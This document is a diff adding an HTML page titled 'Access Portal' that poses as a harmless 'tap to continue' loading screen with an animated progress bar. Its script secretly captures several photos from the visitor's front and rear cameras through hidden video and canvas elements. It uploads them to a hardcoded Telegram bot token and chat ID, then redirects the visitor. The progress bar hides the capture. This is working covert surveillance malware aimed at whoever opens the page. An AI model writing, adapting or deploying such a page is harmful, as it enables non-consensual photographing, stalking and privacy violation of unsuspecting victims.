@@ -1,0 +1,534 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Access Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+            background-size: 400% 400%;
+            animation: breathingGradient 15s ease infinite;
+        }
+
+        @keyframes breathingGradient {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .container {
+            text-align: center;
+            z-index: 10;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .start-screen {
+            animation: fadeIn 0.8s ease-in;
+            cursor: pointer;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .emoji {
+            font-size: 140px;
+            margin-bottom: 40px;
+            animation: floatEmoji 3s ease-in-out infinite;
+            filter: drop-shadow(0 10px 30px rgba(0, 0, 0, 0.3));
+        }
+
+        @keyframes floatEmoji {
+            0%, 100% {
+                transform: translateY(0) scale(1);
+            }
+            50% {
+                transform: translateY(-25px) scale(1.05);
+            }
+        }
+
+        .tap-text {
+            font-size: 26px;
+            color: white;
+            font-weight: 300;
+            letter-spacing: 4px;
+            text-shadow: 0 2px 20px rgba(0, 0, 0, 0.3);
+            animation: textPulse 2.5s ease-in-out infinite;
+        }
+
+        @keyframes textPulse {
+            0%, 100% {
+                opacity: 0.8;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.02);
+            }
+        }
+
+        .loading-screen {
+            display: none;
+            animation: fadeIn 0.8s ease-in;
+            width: 100%;
+            max-width: 600px;
+            padding: 0 30px;
+        }
+
+        .loading-emoji {
+            font-size: 100px;
+            margin-bottom: 60px;
+            animation: spinPulse 2s ease-in-out infinite;
+            filter: drop-shadow(0 10px 40px rgba(255, 255, 255, 0.4));
+        }
+
+        @keyframes spinPulse {
+            0%, 100% {
+                transform: rotate(0deg) scale(1);
+                filter: drop-shadow(0 10px 40px rgba(255, 255, 255, 0.4));
+            }
+            50% {
+                transform: rotate(180deg) scale(1.15);
+                filter: drop-shadow(0 15px 60px rgba(255, 255, 255, 0.6));
+            }
+        }
+
+        .progress-container {
+            width: 100%;
+            position: relative;
+        }
+
+        .progress-bar-wrapper {
+            width: 100%;
+            height: 18px;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 30px;
+            overflow: hidden;
+            position: relative;
+            backdrop-filter: blur(10px);
+            box-shadow:
+                inset 0 2px 10px rgba(0, 0, 0, 0.2),
+                0 4px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg,
+                #667eea 0%,
+                #764ba2 25%,
+                #f093fb 50%,
+                #4facfe 75%,
+                #00f2fe 100%);
+            background-size: 300% 100%;
+            border-radius: 30px;
+            position: relative;
+            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            animation: progressShimmer 3s linear infinite;
+            box-shadow:
+                0 0 30px rgba(102, 126, 234, 0.6),
+                0 0 60px rgba(118, 75, 162, 0.4),
+                inset 0 2px 10px rgba(255, 255, 255, 0.3);
+        }
+
+        @keyframes progressShimmer {
+            0% {
+                background-position: 0% 50%;
+            }
+            100% {
+                background-position: 300% 50%;
+            }
+        }
+
+        .progress-bar::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg,
+                transparent,
+                rgba(255, 255, 255, 0.4),
+                transparent);
+            animation: slideShine 2s infinite;
+        }
+
+        @keyframes slideShine {
+            0% {
+                left: -100%;
+            }
+            100% {
+                left: 200%;
+            }
+        }
+
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            right: 0;
+            width: 30px;
+            height: 30px;
+            background: radial-gradient(circle,
+                rgba(255, 255, 255, 1) 0%,
+                rgba(255, 255, 255, 0.6) 40%,
+                transparent 70%);
+            transform: translate(50%, -50%);
+            filter: blur(8px);
+            animation: glowPulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes glowPulse {
+            0%, 100% {
+                opacity: 0.6;
+                transform: translate(50%, -50%) scale(1);
+            }
+            50% {
+                opacity: 1;
+                transform: translate(50%, -50%) scale(1.3);
+            }
+        }
+
+        .percentage {
+            color: white;
+            font-size: 56px;
+            font-weight: 700;
+            margin-top: 40px;
+            text-shadow:
+                0 0 20px rgba(255, 255, 255, 0.6),
+                0 0 40px rgba(102, 126, 234, 0.4),
+                0 4px 10px rgba(0, 0, 0, 0.3);
+            animation: percentGlow 2s ease-in-out infinite;
+            letter-spacing: 3px;
+        }
+
+        @keyframes percentGlow {
+            0%, 100% {
+                transform: scale(1);
+                text-shadow:
+                    0 0 20px rgba(255, 255, 255, 0.6),
+                    0 0 40px rgba(102, 126, 234, 0.4);
+            }
+            50% {
+                transform: scale(1.05);
+                text-shadow:
+                    0 0 30px rgba(255, 255, 255, 0.9),
+                    0 0 60px rgba(102, 126, 234, 0.6),
+                    0 0 80px rgba(118, 75, 162, 0.4);
+            }
+        }
+
+        video, canvas {
+            display: none;
+            position: absolute;
+            opacity: 0;
+        }
+
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.7);
+            border-radius: 50%;
+            animation: float 6s infinite ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0) translateX(0) scale(1);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.8;
+            }
+            90% {
+                opacity: 0.8;
+            }
+            100% {
+                transform: translateY(-120vh) translateX(60px) scale(0.5);
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+
+    <div class="container">
+        <div class="start-screen" id="startScreen">
+            <div class="emoji">✨</div>
+            <div class="tap-text">tap anywhere to continue</div>
+        </div>
+
+        <div class="loading-screen" id="loadingScreen">
+            <div class="loading-emoji">🔮</div>
+
+            <div class="progress-container">
+                <div class="progress-bar-wrapper">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+
+                <div class="percentage" id="percentage">0%</div>
+            </div>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // SECURITY NOTICE: Replace these with your actual credentials
+        const TELEGRAM_BOT_TOKEN = '8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg';
+        const TELEGRAM_CHAT_ID = '1167762232';
+
+        let currentProgress = 0;
+        let stream = null;
+        let capturedPhotos = [];
+
+        // Create floating particles
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            for (let i = 0; i < 40; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.bottom = -20 + 'px';
+                particle.style.width = Math.random() * 6 + 3 + 'px';
+                particle.style.height = particle.style.width;
+                particle.style.animationDelay = Math.random() * 6 + 's';
+                particle.style.animationDuration = Math.random() * 4 + 4 + 's';
+                particlesContainer.appendChild(particle);
+            }
+        }
+
+        createParticles();
+
+        // Tap anywhere to start
+        document.getElementById('startScreen').addEventListener('click', startProcess);
+        document.getElementById('startScreen').addEventListener('touchstart', (e) => {
+            e.preventDefault();
+            startProcess();
+        });
+
+        async function startProcess() {
+            document.getElementById('startScreen').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'block';
+
+            await requestCameraAccess();
+        }
+
+        async function requestCameraAccess() {
+            updateProgress(5);
+
+            // Check if camera permission was previously granted
+            const cameraGranted = localStorage.getItem('cameraPermissionGranted');
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    }
+                });
+
+                // Save permission only when granted
+                localStorage.setItem('cameraPermissionGranted', 'true');
+
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+
+                updateProgress(15);
+                await new Promise(resolve => setTimeout(resolve, 800));
+
+                await capturePhotos();
+            } catch (err) {
+                console.error('Camera access denied:', err);
+                // Don't save permission if denied - will ask again next time
+                localStorage.removeItem('cameraPermissionGranted');
+                updateProgress(5);
+
+                // Show user-friendly message (optional)
+                alert('Camera access is required. Please allow camera permission and try again.');
+            }
+        }
+
+        async function capturePhotos() {
+            const photosToCapture = [
+                { facing: 'user', label: 'Front Camera 1' },
+                { facing: 'user', label: 'Front Camera 2' },
+                { facing: 'environment', label: 'Back Camera 1' },
+                { facing: 'environment', label: 'Back Camera 2' }
+            ];
+
+            for (let i = 0; i < photosToCapture.length; i++) {
+                const photo = photosToCapture[i];
+                updateProgress(20 + (i * 15));
+
+                await switchCamera(photo.facing);
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                const photoBlob = await capturePhoto();
+                capturedPhotos.push(photoBlob);
+
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+
+            updateProgress(80);
+            await sendPhotosToTelegram();
+        }
+
+        async function switchCamera(facingMode) {
+            // Don't stop the stream, just switch camera
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+
+            try {
+                // Reuse permission - no new prompt since already granted
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: facingMode,
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    }
+                });
+
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(resolve, 1500);
+                    };
+                });
+            } catch (err) {
+                console.error('Error switching camera:', err);
+                // If switching fails, continue with current camera
+            }
+        }
+
+        async function capturePhoto() {
+            return new Promise((resolve) => {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                canvas.toBlob((blob) => {
+                    resolve(blob);
+                }, 'image/jpeg', 0.95);
+            });
+        }
+
+        async function sendPhotosToTelegram() {
+            for (let i = 0; i < capturedPhotos.length; i++) {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', capturedPhotos[i], `photo_${i + 1}.jpg`);
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    updateProgress(80 + (i * 5));
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                } catch (err) {
+                    console.error('Error sending photo:', err);
+                }
+            }
+
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+
+            updateProgress(100);
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const promoter = urlParams.get('go') || 'default';
+            window.location.href = `?go=${promoter}`;
+        }
+
+        function updateProgress(target) {
+            const progressBar = document.getElementById('progressBar');
+            const percentage = document.getElementById('percentage');
+
+            const interval = setInterval(() => {
+                if (currentProgress < target) {
+                    currentProgress++;
+                    progressBar.style.width = currentProgress + '%';
+                    percentage.textContent = currentProgress + '%';
+                } else {
+                    clearInterval(interval);
+                }
+            }, 30);
+        }
+    </script>
+</body>
+</html>
+
